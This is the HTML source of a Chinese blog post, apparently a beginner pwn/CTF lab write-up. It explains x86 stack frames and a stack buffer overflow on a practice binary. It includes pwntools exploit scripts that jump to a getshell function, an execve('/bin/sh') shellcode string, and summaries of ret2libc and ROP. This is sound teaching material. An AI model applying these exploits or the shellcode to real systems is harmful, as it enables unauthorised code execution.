@@ -1,0 +1,657 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 3.9.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.4.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.4.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.4.0">
+  <link rel="mask-icon" href="/images/logo.svg?v=7.4.0" color="#222">
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+
+<link rel="stylesheet" href="/css/main.css?v=7.4.0">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.4.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":false,"show_result":false,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: 'search.xml',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: 'Copy',
+      copy_success: 'Copied',
+      copy_failure: 'Copy failed'
+    },
+    sidebarPadding: 40
+  };
+</script>
+
+  <meta name="description" content="栈溢出基础入门实例这是一个简单的栈溢出实例，来自i春秋。">
+<meta name="keywords" content="Linux,栈溢出">
+<meta property="og:type" content="article">
+<meta property="og:title" content="stack-overflow-eg">
+<meta property="og:url" content="http://yoursite.com/2019/11/04/stack-overflow-eg/index.html">
+<meta property="og:site_name" content="CoderSim&#39;s Growth Diary">
+<meta property="og:description" content="栈溢出基础入门实例这是一个简单的栈溢出实例，来自i春秋。">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="http://yoursite.com/images/stack-overflow-eg/14.png">
+<meta property="og:image" content="http://yoursite.com/images/stack-overflow-eg/01.png">
+<meta property="og:image" content="http://yoursite.com/images/stack-overflow-eg/08.png">
+<meta property="og:image" content="http://yoursite.com/images/stack-overflow-eg/02.png">
+<meta property="og:image" content="http://yoursite.com/images/stack-overflow-eg/09.png">
+<meta property="og:image" content="http://yoursite.com/images/stack-overflow-eg/03.png">
+<meta property="og:image" content="http://yoursite.com/images/stack-overflow-eg/04.png">
+<meta property="og:image" content="http://yoursite.com/images/stack-overflow-eg/10.png">
+<meta property="og:image" content="http://yoursite.com/images/stack-overflow-eg/05.png">
+<meta property="og:image" content="http://yoursite.com/images/stack-overflow-eg/11.png">
+<meta property="og:image" content="http://yoursite.com/images/stack-overflow-eg/06.png">
+<meta property="og:image" content="http://yoursite.com/images/stack-overflow-eg/12.png">
+<meta property="og:image" content="http://yoursite.com/images/stack-overflow-eg/07.png">
+<meta property="og:image" content="http://yoursite.com/images/stack-overflow-eg/13.png">
+<meta property="og:image" content="http://yoursite.com/images/stack-overflow-eg/15.png">
+<meta property="og:image" content="http://yoursite.com/images/stack-overflow-eg/16.png">
+<meta property="og:image" content="http://yoursite.com/images/stack-overflow-eg/17.png">
+<meta property="og:image" content="http://yoursite.com/images/stack-overflow-eg/18.jpg">
+<meta property="og:image" content="http://yoursite.com/images/stack-overflow-eg/19.jpg">
+<meta property="og:image" content="http://yoursite.com/images/stack-overflow-eg/20.jpg">
+<meta property="og:image" content="http://yoursite.com/images/stack-overflow-eg/21.jpg">
+<meta property="og:updated_time" content="2019-11-27T18:18:32.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="stack-overflow-eg">
+<meta name="twitter:description" content="栈溢出基础入门实例这是一个简单的栈溢出实例，来自i春秋。">
+<meta name="twitter:image" content="http://yoursite.com/images/stack-overflow-eg/14.png">
+  <link rel="canonical" href="http://yoursite.com/2019/11/04/stack-overflow-eg/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>stack-overflow-eg | CoderSim's Growth Diary</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">CoderSim's Growth Diary</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+        <h1 class="site-subtitle" itemprop="description">extoll the world's best C and Java</h1>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+      
+      
+      
+        
+        <li class="menu-item menu-item-home">
+      
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-about">
+      
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>About</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-tags">
+      
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>Tags</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-categories">
+      
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>Categories</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-archives">
+      
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a href="javascript:;" class="popup-trigger">
+        
+          <i class="menu-item-icon fa fa-search fa-fw"></i> <br>Search</a>
+      </li>
+    
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="none"
+           placeholder="Searching..." spellcheck="false"
+           type="text" id="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+      <article itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block post">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/04/stack-overflow-eg/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="CoderSim">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/assets/blogImages/headImag.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CoderSim's Growth Diary">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">stack-overflow-eg
+
+          
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              
+                
+              
+
+              <time title="Created: 2019-11-04 21:14:22" itemprop="dateCreated datePublished" datetime="2019-11-04T21:14:22+08:00">2019-11-04</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2019-11-28 02:18:32" itemprop="dateModified" datetime="2019-11-28T02:18:32+08:00">2019-11-28</time>
+              </span>
+            
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>栈溢出基础入门实例<br>这是一个简单的栈溢出实例，来自i春秋。</p>
+<a id="more"></a>
+<p>前一篇文章<a href="https://onecoderman.github.io/2019/10/30/docker-IDAPro/#more" target="_blank" rel="noopener">docker-IDAPro</a></p>
+<h1 id="0x00-基础知识"><a href="#0x00-基础知识" class="headerlink" title="0x00 基础知识"></a>0x00 基础知识</h1><p>这是一个32位的程序。<code>x86</code>的通用寄存器是<code>eax</code>,<code>ebx</code>,<code>ecx</code>,<code>ebp</code>,<code>esp</code>,<code>esi</code>,<code>edi</code><br>x86体系调用过程见[4]</p>
+<h2 id="call指令"><a href="#call指令" class="headerlink" title="call指令"></a>call指令</h2><p><code>call function</code>在<code>x86</code>下的功能</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push IP  #保存返回地址</span><br><span class="line">mov IP, [function]  #修改IP</span><br></pre></td></tr></table></figure>
+
+<h2 id="leave指令"><a href="#leave指令" class="headerlink" title="leave指令"></a>leave指令</h2><p><code>leave</code>指令是调整栈帧的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov esp, ebp #sp指向bp</span><br><span class="line">pop ebp   #返回原来的bp</span><br></pre></td></tr></table></figure>
+
+<h2 id="ret指令"><a href="#ret指令" class="headerlink" title="ret指令"></a>ret指令</h2><p><code>x86</code>下是修改EIP用的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pop eip</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x01-函数调用过程分析"><a href="#0x01-函数调用过程分析" class="headerlink" title="0x01 函数调用过程分析"></a>0x01 函数调用过程分析</h1><p>将<code>hello</code>文件上传到linux系统，参考文献[3]。<br>下面是<code>hello</code>函数的伪代码<br><img src="/images/stack-overflow-eg/14.png" alt="pic"><br>在x86下函数调用是cdecl调用约定，参数从右到左以此压入栈。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb hello</span><br><span class="line">(gdb) b main</span><br><span class="line">(gdb) start</span><br></pre></td></tr></table></figure>
+
+<h2 id="call-hello前的情况"><a href="#call-hello前的情况" class="headerlink" title="call hello前的情况"></a>call hello前的情况</h2><p><img src="/images/stack-overflow-eg/01.png" alt="pic"><br>此时的栈情况如下所示<br><img src="/images/stack-overflow-eg/08.png" alt="pic"></p>
+<h2 id="进入hello函数"><a href="#进入hello函数" class="headerlink" title="进入hello函数"></a>进入hello函数</h2><p><img src="/images/stack-overflow-eg/02.png" alt="pic"><br>调用<code>call</code>指令其实是<code>push IP  #保存返回地址</code>与<code>mov IP, [function]  #修改IP</code>两条指令<br>此时栈的情况如下所示<br><img src="/images/stack-overflow-eg/09.png" alt="pic"><br><br><br>可以看一下hello函数的代码<br><img src="/images/stack-overflow-eg/03.png" alt="pic"></p>
+<h2 id="产生新的栈帧"><a href="#产生新的栈帧" class="headerlink" title="产生新的栈帧"></a>产生新的栈帧</h2><p><img src="/images/stack-overflow-eg/04.png" alt="pic"><br>通过函数的前两句指令，新的栈帧产生，此时栈的情况如下所示<br><img src="/images/stack-overflow-eg/10.png" alt="pic"><br>然后在栈帧中进行函数的功能操作，可以随着函数的执行，栈一直在生长(sp会减小)，停留下来看read函数的执行。</p>
+<h2 id="read函数的情形"><a href="#read函数的情形" class="headerlink" title="read函数的情形"></a>read函数的情形</h2><p><img src="/images/stack-overflow-eg/05.png" alt="pic"><br>可以看到<code>read</code>执行的时候，读取的值保持在地址<code>0xffffd656</code>处。<br>栈一直生长，此时看到的栈如下所示<br><img src="/images/stack-overflow-eg/11.png" alt="pic"></p>
+<h2 id="leave前，退出hello函数前的情况"><a href="#leave前，退出hello函数前的情况" class="headerlink" title="leave前，退出hello函数前的情况"></a>leave前，退出hello函数前的情况</h2><p><img src="/images/stack-overflow-eg/06.png" alt="pic"><br>hello函数主体功能已经完成，需要销毁栈帧，回退到调用之前的栈状态。<br>此时的栈情况如下<br><img src="/images/stack-overflow-eg/12.png" alt="pic"></p>
+<h2 id="leave后"><a href="#leave后" class="headerlink" title="leave后"></a>leave后</h2><p>leave指令的作用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov esp, ebp #sp指向bp</span><br><span class="line">pop ebp   #返回原来的bp</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/stack-overflow-eg/07.png" alt="pic"><br>此时栈的情况如下<br><img src="/images/stack-overflow-eg/13.png" alt="pic"><br>可以看到，此时的栈的bp已经回到了调用之前的栈底，栈顶元素就是返回地址。<br>然后执行<code>pop ip</code>修改IP位当前栈顶元素，从而实现程序跳转到原来的<code>main</code>函数。<br>然后可以进行出栈操作可以恢复现场，这些参数存储着原来的值。</p>
+<h1 id="0x01-漏洞利用原理"><a href="#0x01-漏洞利用原理" class="headerlink" title="0x01 漏洞利用原理"></a>0x01 漏洞利用原理</h1><p>从read函数情形那里可以看出，输入的数据保存在地址<code>0xffffd656</code>处。而保存的返回IP地址在<code>0xffffd66c</code>,我们只要覆盖<code>0xffffd66c</code>处的值（这里是保存的IP值，修改之后便能跳转）。<br>两者的距离是<code>0xffffd66c</code>-<code>0xffffd656</code>=<code>0x16</code><br>所以输入<code>A</code>*0x16+一个地址就能达到覆盖返回地址的值，实现程序跳转。<br>这个程序在地址<code>0x0804846B</code>处有一个后门，是一个叫<code>getshell</code>的函数<br><img src="/images/stack-overflow-eg/15.png" alt="pic"></p>
+<h1 id="0x02-pwntools与docker环境的复现"><a href="#0x02-pwntools与docker环境的复现" class="headerlink" title="0x02 pwntools与docker环境的复现"></a>0x02 pwntools与docker环境的复现</h1><ul>
+<li><p>step1: 端口转发</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat tcp-listen:10001,reuseaddr,fork EXEC:./hello,pty,raw,echo=0</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>step2: 本地主机上打开python<br>依次执行下面命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io=remote(&quot;172.17.0.2&quot;,10001)</span><br><span class="line">payload=22*&apos;A&apos;+p32(0x804846b)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>step3: 获得shell<br>可以看到如下情况<br><img src="/images/stack-overflow-eg/16.png" alt="pic"></p>
+</li>
+</ul>
+<h1 id="0x03-pwntools在本地主机复现"><a href="#0x03-pwntools在本地主机复现" class="headerlink" title="0x03 pwntools在本地主机复现"></a>0x03 pwntools在本地主机复现</h1><p>这里不通过端口转发，直接在本地环境上实验<br>在本地主机上写上如下脚本<code>exploit.py</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = process(&apos;./hello&apos;)</span><br><span class="line">payload = &apos;A&apos;*22+p32(0x0804846b)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>运行脚本<code>python exploit.py</code><br>可以看到如下情况<br><img src="/images/stack-overflow-eg/17.png" alt="pic"></p>
+<h1 id="0x04-python输出十六进制字符"><a href="#0x04-python输出十六进制字符" class="headerlink" title="0x04 python输出十六进制字符"></a>0x04 python输出十六进制字符</h1><p>这里的python是值python2，python3会因为编码默认位utf-8编码，所以不会产生预期的结果，需要设置编码。</p>
+<h2 id="输出十六进制字符"><a href="#输出十六进制字符" class="headerlink" title="输出十六进制字符"></a>输出十六进制字符</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &apos;print(22*&quot;A&quot;+&quot;\x6b\x84\x04\x08&quot;)&apos; &gt; text</span><br></pre></td></tr></table></figure>
+
+<p><strong>注意，这种方式末尾有一个换行符</strong><br>因此，可以使用下面的<code>gen.py</code>生产我们的十六进字符，<code>f.write()</code>不会添加自动换行。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">f = open(&apos;text&apos;,&apos;w&apos;)</span><br><span class="line">s = &quot;\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span><br><span class="line">f.write(s)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>
+
+<p>使用命令运行<code>python gen.py</code>就可以得到我们的text文件。<br>可以进行<code>(gdb) run &lt; text</code>调试</p>
+<h2 id="以十六进制格式查看文件"><a href="#以十六进制格式查看文件" class="headerlink" title="以十六进制格式查看文件"></a>以十六进制格式查看文件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from __future__ import print_function</span><br><span class="line">f = open(&apos;text&apos;,&apos;rb&apos;)</span><br><span class="line">n = 0;</span><br><span class="line">s = f.read(1)</span><br><span class="line">while s:</span><br><span class="line">        byte = ord(s)</span><br><span class="line">        n = n+1</span><br><span class="line">        print(&apos;0x%02x,&apos;%(byte),end=&apos;&apos;)</span><br><span class="line">        if n%16==0:</span><br><span class="line">                print(&apos;&apos;)</span><br><span class="line">        s = f.read(1)</span><br><span class="line">print(&apos;\n\ntotal bytes: %d&apos;%n)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x05转发调试"><a href="#0x05转发调试" class="headerlink" title="0x05转发调试"></a>0x05转发调试</h1><p>这个是为了方便输入一些不可见字符，方便gdb调试。</p>
+<ul>
+<li>step1：将程序的IO端口利用socat进行转发</li>
+<li>step2: 使用<code>gdb attach pid</code>进行附加调试</li>
+<li>step3: 使用pwntools进行调试，同0x02。</li>
+</ul>
+<h1 id="0x06拓展-栈溢出利用的技巧"><a href="#0x06拓展-栈溢出利用的技巧" class="headerlink" title="0x06拓展_栈溢出利用的技巧"></a>0x06拓展_栈溢出利用的技巧</h1><p>我们主要的目标是覆盖返回地址，控制程序流程。这里的知识笔记来自于参考文献[6]。<br>一些常用的覆盖技术如下：<br>修改栈中的返回地址，指向栈中的一段数据指令（shellcode）<br>修改栈中的返回地址，指向内存中已有的某个函数（return2libc）<br>修改栈中的返回地址，其指向内存中已有的一段指令（ROP）<br>修改某个被调用函数的地址，其指向另一个函数（hijack GOT）</p>
+<h2 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h2><p>前提：栈上的数据有执行权限。<br>这种利用方法的栈情况如下(图片来源于参考文献[6])，红色部分就是要构造的payload。<br><img src="/images/stack-overflow-eg/18.jpg" alt="pic18"><br>这里有两个关键的问题需要解决：</p>
+<ul>
+<li>Q1:覆盖到返回地址之前的padding1长度如何获知？<br>A1:使用gdb调试工具查看汇编代码获得，本文上面部分0x01；运行过程中输入不同的”AAA”进行试探；使用idaPro反汇编功能。</li>
+<li>Q2：shellcode的起始地址如何确定？<br>A1:padding2填充若干的”\x90”(nop)，增大命中几率。</li>
+</ul>
+<h2 id="return2libc"><a href="#return2libc" class="headerlink" title="return2libc"></a>return2libc</h2><p>一个简单的示例是条用system()函数打开shell，system(“/bin/sh)。<br><img src="/images/stack-overflow-eg/19.jpg" alt="pic18"><br>padding2 处的数据长度为4（32位机），对应调用 system() 时的返回地址[6]。</p>
+<h2 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h2><p>目标函数在内存内无法找到，在内存中寻找多个指令片段，拼凑出一系列操作来达成目的。<br>执行某段指令(称为“gadget”)。<br><img src="/images/stack-overflow-eg/20.jpg" alt="pic18"><br>上图是一个当个gadget数据的情况。<br>连续执行若干段指令，就需要每个 gadget 执行完毕可以将控制权交给下一个 gadget。[7]<br><img src="/images/stack-overflow-eg/21.jpg" alt="pic18"></p>
+<blockquote>
+<p>对于前置的docker环境搭建和调试代码，可参考文献[2]</p>
+</blockquote>
+<h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><p>[1] <a href="https://mp.weixin.qq.com/s/r4F_b5wUVluZkgLMHb574Q" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/r4F_b5wUVluZkgLMHb574Q</a><br>[2] <a href="https://rj45mp.github.io/2019/08/07/i春秋linux-pwn入门教程复现之栈溢出基础/" target="_blank" rel="noopener">https://rj45mp.github.io/2019/08/07/i春秋linux-pwn入门教程复现之栈溢出基础/</a><br>[3] <a href="https://pan.baidu.com/s/10nqi8s-hkjqIt4RTl869nw" target="_blank" rel="noopener">https://pan.baidu.com/s/10nqi8s-hkjqIt4RTl869nw</a>   环境和代码（porf）[key borad -1]<br>[4] <a href="https://rj45mp.github.io/2019/09/30/x86%E6%9E%B6%E6%9E%84%E4%B8%8Ex64%E6%9E%B6%E6%9E%84%E5%9C%A8%E5%87%BD%E6%95%B0%E4%BA%8E%E6%A0%88%E4%B8%AD%E8%B0%83%E7%94%A8%E8%BF%87%E7%A8%8B%E7%9A%84%E4%B8%8D%E5%90%8C%E4%B9%8B%E5%A4%84/?tdsourcetag=s_pctim_aiomsg" target="_blank" rel="noopener">https://rj45mp.github.io/2019/09/30/x86%E6%9E%B6%E6%9E%84%E4%B8%8Ex64%E6%9E%B6%E6%9E%84%E5%9C%A8%E5%87%BD%E6%95%B0%E4%BA%8E%E6%A0%88%E4%B8%AD%E8%B0%83%E7%94%A8%E8%BF%87%E7%A8%8B%E7%9A%84%E4%B8%8D%E5%90%8C%E4%B9%8B%E5%A4%84/?tdsourcetag=s_pctim_aiomsg</a><br>[5] <a href="https://blog.csdn.net/jctian000/article/details/85099980" target="_blank" rel="noopener">https://blog.csdn.net/jctian000/article/details/85099980</a> 读取十六进代码<br>[6] <a href="https://zhuanlan.zhihu.com/p/25816426" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/25816426</a><br>[7] <a href="https://zhuanlan.zhihu.com/p/25892385" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/25892385</a></p>
+
+    </div>
+
+    
+    
+    
+        
+      
+
+      <footer class="post-footer">
+          
+            
+          
+          <div class="post-tags">
+            
+              <a href="/tags/Linux/" rel="tag"># Linux</a>
+            
+              <a href="/tags/栈溢出/" rel="tag"># 栈溢出</a>
+            
+          </div>
+        
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-next post-nav-item">
+              
+                <a href="/2019/11/03/SciPy-basic/" rel="next" title="SciPy-basic">
+                  <i class="fa fa-chevron-left"></i> SciPy-basic
+                </a>
+              
+            </div>
+
+            <span class="post-nav-divider"></span>
+
+            <div class="post-nav-prev post-nav-item">
+              
+                <a href="/2019/11/14/linuxcmd/" rel="prev" title="linuxcmd">
+                  linuxcmd <i class="fa fa-chevron-right"></i>
+                </a>
+              
+            </div>
+          </div>
+        
+      </footer>
+    
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+
+        </div>
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+        
+        
+        
+        
+      
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x00-基础知识"><span class="nav-number">1.</span> <span class="nav-text">0x00 基础知识</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#call指令"><span class="nav-number">1.1.</span> <span class="nav-text">call指令</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#leave指令"><span class="nav-number">1.2.</span> <span class="nav-text">leave指令</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ret指令"><span class="nav-number">1.3.</span> <span class="nav-text">ret指令</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-函数调用过程分析"><span class="nav-number">2.</span> <span class="nav-text">0x01 函数调用过程分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#call-hello前的情况"><span class="nav-number">2.1.</span> <span class="nav-text">call hello前的情况</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#进入hello函数"><span class="nav-number">2.2.</span> <span class="nav-text">进入hello函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#产生新的栈帧"><span class="nav-number">2.3.</span> <span class="nav-text">产生新的栈帧</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#read函数的情形"><span class="nav-number">2.4.</span> <span class="nav-text">read函数的情形</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#leave前，退出hello函数前的情况"><span class="nav-number">2.5.</span> <span class="nav-text">leave前，退出hello函数前的情况</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#leave后"><span class="nav-number">2.6.</span> <span class="nav-text">leave后</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-漏洞利用原理"><span class="nav-number">3.</span> <span class="nav-text">0x01 漏洞利用原理</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-pwntools与docker环境的复现"><span class="nav-number">4.</span> <span class="nav-text">0x02 pwntools与docker环境的复现</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-pwntools在本地主机复现"><span class="nav-number">5.</span> <span class="nav-text">0x03 pwntools在本地主机复现</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x04-python输出十六进制字符"><span class="nav-number">6.</span> <span class="nav-text">0x04 python输出十六进制字符</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#输出十六进制字符"><span class="nav-number">6.1.</span> <span class="nav-text">输出十六进制字符</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#以十六进制格式查看文件"><span class="nav-number">6.2.</span> <span class="nav-text">以十六进制格式查看文件</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x05转发调试"><span class="nav-number">7.</span> <span class="nav-text">0x05转发调试</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x06拓展-栈溢出利用的技巧"><span class="nav-number">8.</span> <span class="nav-text">0x06拓展_栈溢出利用的技巧</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#shellcode"><span class="nav-number">8.1.</span> <span class="nav-text">shellcode</span></a></li><li class="nav-item nav-level-2"><a 